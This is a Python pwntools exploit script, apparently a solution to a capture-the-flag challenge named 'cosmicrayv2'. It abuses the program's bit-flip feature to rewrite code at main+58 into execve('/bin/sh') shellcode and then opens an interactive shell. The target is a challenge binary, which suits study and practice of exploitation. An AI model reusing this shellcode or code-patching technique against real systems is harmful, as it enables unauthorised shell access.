from pwn import *

io = process('./cosmicrayv2')
#io = remote('vsc.tf', 3047)

# the original byte code at main+58
source = [0x48, 0x8d, 0x05, 0xa0, 0x0a, 0x00, 0x00, 0x48, 0x89, 0xc7, 0xe8, 0xcd, 0xfa, 0xff, 0xff, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x5d, 0xc3, 0x00]
# our shellcode
dest = [0x48, 0x31, 0xd2, 0x48, 0x31, 0xf6, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x54, 0x5f, 0xb0, 0x3b, 0x0f, 0x05]
# address of main+58
shell_addr = 0x401624


def flip_bit(addr, src, dst):
    src = bin(src)[2:].rjust(8, '0')
    dst = bin(dst)[2:].rjust(8, '0')
    addr = hex(addr).encode()
    for i in range(8):
        if(src[i] != dst[i]):
            io.recvuntil(b'through:\n')
            io.sendline(addr)
            io.recvuntil(b'flip:\n')
            io.sendline(str(i).encode())

# flipin' so that the `je cosmic_ray+506`` instruction jump pass the cosmic_ray function into the main+6 function
io.recvuntil(b'through:\n')
io.sendline(b'0x4015e2')
io.recvuntil(b'flip:\n')
io.sendline(b'4')

# we flipin' so that the byte code at main+58 become our shellcode
for j in range(len(source)):
    flip_bit(shell_addr+j, source[j], dest[j])

# flip back agane to normal execution, by this time the cosmic_ray function will return to main+58 aka our shellcode
io.recvuntil(b'through:\n')
io.sendline(b'0x4015e2')
io.recvuntil(b'flip:\n')
io.sendline(b'4')

io.interactive()